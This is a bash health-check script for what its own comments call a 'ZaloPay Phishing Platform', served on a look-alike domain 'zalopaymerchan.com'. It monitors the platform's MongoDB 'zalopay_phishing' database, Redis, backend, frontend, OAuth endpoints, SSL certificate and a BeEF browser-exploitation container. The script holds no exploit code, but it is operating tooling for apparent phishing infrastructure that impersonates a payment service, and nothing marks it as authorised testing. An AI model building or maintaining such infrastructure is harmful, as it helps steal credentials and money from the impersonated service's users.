#!/bin/bash

# Health Check Script for ZaloPay Phishing Platform
# This script checks the health of all services

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
DOMAIN="zalopaymerchan.com"
DOCKER_COMPOSE_FILE="docker-compose.yml"

# Functions
log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

check_docker_services() {
    log_info "Checking Docker services..."
    
    # Check if docker-compose is running
    if ! docker-compose -f $DOCKER_COMPOSE_FILE ps | grep -q "Up"; then
        log_error "Docker services are not running"
        return 1
    fi
    
    log_success "Docker services are running"
    return 0
}

check_mongodb() {
    log_info "Checking MongoDB..."
    
    # Check if MongoDB container is running
    if ! docker-compose -f $DOCKER_COMPOSE_FILE ps mongodb | grep -q "Up"; then
        log_error "MongoDB container is not running"
        return 1
    fi
    
    # Check MongoDB connection
    if docker-compose -f $DOCKER_COMPOSE_FILE exec -T mongodb mongosh --eval "db.runCommand('ping')" &> /dev/null; then
        log_success "MongoDB is healthy"
        return 0
    else
        log_error "MongoDB connection failed"
        return 1
    fi
}

check_redis() {
    log_info "Checking Redis..."
    
    # Check if Redis container is running
    if ! docker-compose -f $DOCKER_COMPOSE_FILE ps redis | grep -q "Up"; then
        log_error "Redis container is not running"
        return 1
    fi
    
    # Check Redis connection
    if docker-compose -f $DOCKER_COMPOSE_FILE exec -T redis redis-cli ping &> /dev/null; then
        log_success "Redis is healthy"
        return 0
    else
        log_error "Redis connection failed"
        return 1
    fi
}

check_influxdb() {
    log_info "Checking InfluxDB..."
    
    # Check if InfluxDB container is running
    if ! docker-compose -f $DOCKER_COMPOSE_FILE ps influxdb | grep -q "Up"; then
        log_error "InfluxDB container is not running"
        return 1
    fi
    
    # Check InfluxDB health endpoint
    if curl -s http://localhost:8086/health &> /dev/null; then
        log_success "InfluxDB is healthy"
        return 0
    else
        log_error "InfluxDB health check failed"
        return 1
    fi
}

check_backend() {
    log_info "Checking Backend..."
    
    # Check if Backend container is running
    if ! docker-compose -f $DOCKER_COMPOSE_FILE ps backend | grep -q "Up"; then
        log_error "Backend container is not running"
        return 1
    fi
    
    # Check Backend health endpoint
    if curl -s http://localhost:8000/health &> /dev/null; then
        log_success "Backend is healthy"
        return 0
    else
        log_error "Backend health check failed"
        return 1
    fi
}

check_frontend() {
    log_info "Checking Frontend..."
    
    # Check if Frontend container is running
    if ! docker-compose -f $DOCKER_COMPOSE_FILE ps frontend | grep -q "Up"; then
        log_error "Frontend container is not running"
        return 1
    fi
    
    # Check Frontend accessibility
    if curl -s http://localhost:80 &> /dev/null; then
        log_success "Frontend is healthy"
        return 0
    else
        log_error "Frontend health check failed"
        return 1
    fi
}

check_beef() {
    log_info "Checking BeEF..."
    
    # Check if BeEF container is running
    if ! docker-compose -f $DOCKER_COMPOSE_FILE ps beef | grep -q "Up"; then
        log_error "BeEF container is not running"
        return 1
    fi
    
    # Check BeEF accessibility
    if curl -s http://localhost:3000 &> /dev/null; then
        log_success "BeEF is healthy"
        return 0
    else
        log_error "BeEF health check failed"
        return 1
    fi
}

check_ssl() {
    log_info "Checking SSL certificates..."
    
    # Check if SSL certificate exists
    if [ -f "ssl/live/$DOMAIN/fullchain.pem" ]; then
        log_success "SSL certificate exists"
        
        # Check certificate expiration
        cert_expiry=$(openssl x509 -in "ssl/live/$DOMAIN/fullchain.pem" -noout -enddate | cut -d= -f2)
        cert_expiry_epoch=$(date -d "$cert_expiry" +%s)
        current_epoch=$(date +%s)
        days_until_expiry=$(( (cert_expiry_epoch - current_epoch) / 86400 ))
        
        if [ $days_until_expiry -gt 30 ]; then
            log_success "SSL certificate is valid for $days_until_expiry days"
        elif [ $days_until_expiry -gt 7 ]; then
            log_warning "SSL certificate expires in $days_until_expiry days"
        else
            log_error "SSL certificate expires in $days_until_expiry days"
        fi
        
        return 0
    else
        log_error "SSL certificate not found"
        return 1
    fi
}

check_domain() {
    log_info "Checking domain accessibility..."
    
    # Check HTTP accessibility
    if curl -s -I http://$DOMAIN | grep -q "200 OK"; then
        log_success "Domain is accessible via HTTP"
    else
        log_warning "Domain is not accessible via HTTP"
    fi
    
    # Check HTTPS accessibility
    if curl -s -I https://$DOMAIN | grep -q "200 OK"; then
        log_success "Domain is accessible via HTTPS"
        return 0
    else
        log_error "Domain is not accessible via HTTPS"
        return 1
    fi
}

check_database_connections() {
    log_info "Checking database connections..."
    
    # Check MongoDB collections
    if docker-compose -f $DOCKER_COMPOSE_FILE exec -T mongodb mongosh zalopay_phishing --eval "db.stats()" &> /dev/null; then
        log_success "MongoDB database is accessible"
    else
        log_error "MongoDB database is not accessible"
        return 1
    fi
    
    # Check Redis keys
    if docker-compose -f $DOCKER_COMPOSE_FILE exec -T redis redis-cli dbsize &> /dev/null; then
        log_success "Redis database is accessible"
    else
        log_error "Redis database is not accessible"
        return 1
    fi
    
    return 0
}

check_api_endpoints() {
    log_info "Checking API endpoints..."
    
    # Check admin API
    if curl -s http://localhost:8000/api/admin/dashboard/stats &> /dev/null; then
        log_success "Admin API is accessible"
    else
        log_warning "Admin API is not accessible"
    fi
    
    # Check OAuth endpoints
    if curl -s http://localhost:8000/api/oauth/google &> /dev/null; then
        log_success "OAuth endpoints are accessible"
    else
        log_warning "OAuth endpoints are not accessible"
    fi
    
    return 0
}

check_logs() {
    log_info "Checking logs..."
    
    # Check if log files exist
    if [ -d "logs" ] && [ "$(ls -A logs)" ]; then
        log_success "Log files are being generated"
        
        # Check log file sizes
        for log_file in logs/*.log; do
            if [ -f "$log_file" ]; then
                size=$(stat -f%z "$log_file" 2>/dev/null || stat -c%s "$log_file" 2>/dev/null)
                if [ $size -gt 0 ]; then
                    log_success "Log file $log_file has content ($size bytes)"
                else
                    log_warning "Log file $log_file is empty"
                fi
            fi
        done
    else
        log_warning "No log files found"
    fi
    
    return 0
}

check_disk_space() {
    log_info "Checking disk space..."
    
    # Check available disk space
    available_space=$(df -h . | awk 'NR==2 {print $4}')
    log_info "Available disk space: $available_space"
    
    # Check if disk space is low
    available_percent=$(df . | awk 'NR==2 {print $5}' | sed 's/%//')
    if [ $available_percent -gt 90 ]; then
        log_error "Disk space is critically low ($available_percent% used)"
        return 1
    elif [ $available_percent -gt 80 ]; then
        log_warning "Disk space is getting low ($available_percent% used)"
    else
        log_success "Disk space is adequate ($available_percent% used)"
    fi
    
    return 0
}

check_memory_usage() {
    log_info "Checking memory usage..."
    
    # Check system memory
    total_memory=$(free -m | awk 'NR==2{print $2}')
    used_memory=$(free -m | awk 'NR==2{print $3}')
    available_memory=$(free -m | awk 'NR==2{print $7}')
    
    log_info "Total memory: ${total_memory}MB"
    log_info "Used memory: ${used_memory}MB"
    log_info "Available memory: ${available_memory}MB"
    
    # Check if memory usage is high
    memory_percent=$((used_memory * 100 / total_memory))
    if [ $memory_percent -gt 90 ]; then
        log_error "Memory usage is critically high ($memory_percent%)"
        return 1
    elif [ $memory_percent -gt 80 ]; then
        log_warning "Memory usage is high ($memory_percent%)"
    else
        log_success "Memory usage is normal ($memory_percent%)"
    fi
    
    return 0
}

check_cpu_usage() {
    log_info "Checking CPU usage..."
    
    # Check CPU usage
    cpu_usage=$(top -bn1 | grep "Cpu(s)" | awk '{print $2}' | awk -F'%' '{print $1}')
    
    if [ -n "$cpu_usage" ]; then
        log_info "CPU usage: ${cpu_usage}%"
        
        # Check if CPU usage is high
        if (( $(echo "$cpu_usage > 90" | bc -l) )); then
            log_error "CPU usage is critically high ($cpu_usage%)"
            return 1
        elif (( $(echo "$cpu_usage > 80" | bc -l) )); then
            log_warning "CPU usage is high ($cpu_usage%)"
        else
            log_success "CPU usage is normal ($cpu_usage%)"
        fi
    else
        log_warning "Could not determine CPU usage"
    fi
    
    return 0
}

generate_health_report() {
    log_info "Generating health report..."
    
    report_file="health_report_$(date +%Y%m%d_%H%M%S).txt"
    
    {
        echo "ZaloPay Phishing Platform Health Report"
        echo "Generated: $(date)"
        echo "=================================="
        echo ""
        
        echo "Service Status:"
        echo "==============="
        docker-compose -f $DOCKER_COMPOSE_FILE ps
        echo ""
        
        echo "System Resources:"
        echo "================="
        echo "Disk Space:"
        df -h
        echo ""
        echo "Memory Usage:"
        free -h
        echo ""
        echo "CPU Usage:"
        top -bn1 | grep "Cpu(s)"
        echo ""
        
        echo "Recent Logs:"
        echo "============"
        if [ -d "logs" ]; then
            for log_file in logs/*.log; do
                if [ -f "$log_file" ]; then
                    echo "--- $log_file (last 10 lines) ---"
                    tail -10 "$log_file"
                    echo ""
                fi
            done
        fi
        
    } > "$report_file"
    
    log_success "Health report generated: $report_file"
}

# Main health check function
health_check() {
    log_info "Starting health check..."
    echo "=================================="
    
    local exit_code=0
    
    # Check Docker services
    if ! check_docker_services; then
        exit_code=1
    fi
    
    # Check individual services
    if ! check_mongodb; then
        exit_code=1
    fi
    
    if ! check_redis; then
        exit_code=1
    fi
    
    if ! check_influxdb; then
        exit_code=1
    fi
    
    if ! check_backend; then
        exit_code=1
    fi
    
    if ! check_frontend; then
        exit_code=1
    fi
    
    if ! check_beef; then
        exit_code=1
    fi
    
    # Check SSL
    if ! check_ssl; then
        exit_code=1
    fi
    
    # Check domain
    if ! check_domain; then
        exit_code=1
    fi
    
    # Check database connections
    if ! check_database_connections; then
        exit_code=1
    fi
    
    # Check API endpoints
    check_api_endpoints
    
    # Check logs
    check_logs
    
    # Check system resources
    if ! check_disk_space; then
        exit_code=1
    fi
    
    if ! check_memory_usage; then
        exit_code=1
    fi
    
    if ! check_cpu_usage; then
        exit_code=1
    fi
    
    # Generate health report
    generate_health_report
    
    echo "=================================="
    if [ $exit_code -eq 0 ]; then
        log_success "Health check completed successfully!"
    else
        log_error "Health check completed with errors!"
    fi
    
    return $exit_code
}

# Handle command line arguments
case "${1:-health}" in
    "health")
        health_check
        ;;
    "services")
        check_docker_services
        check_mongodb
        check_redis
        check_influxdb
        check_backend
        check_frontend
        check_beef
        ;;
    "ssl")
        check_ssl
        ;;
    "domain")
        check_domain
        ;;
    "databases")
        check_database_connections
        ;;
    "api")
        check_api_endpoints
        ;;
    "logs")
        check_logs
        ;;
    "resources")
        check_disk_space
        check_memory_usage
        check_cpu_usage
        ;;
    "report")
        generate_health_report
        ;;
    *)
        echo "Usage: $0 {health|services|ssl|domain|databases|api|logs|resources|report}"
        echo ""
        echo "Commands:"
        echo "  health     - Complete health check (default)"
        echo "  services   - Check all services"
        echo "  ssl        - Check SSL certificates"
        echo "  domain     - Check domain accessibility"
        echo "  databases  - Check database connections"
        echo "  api        - Check API endpoints"
        echo "  logs       - Check logs"
        echo "  resources  - Check system resources"
        echo "  report     - Generate health report only"
        exit 1
        ;;
esac
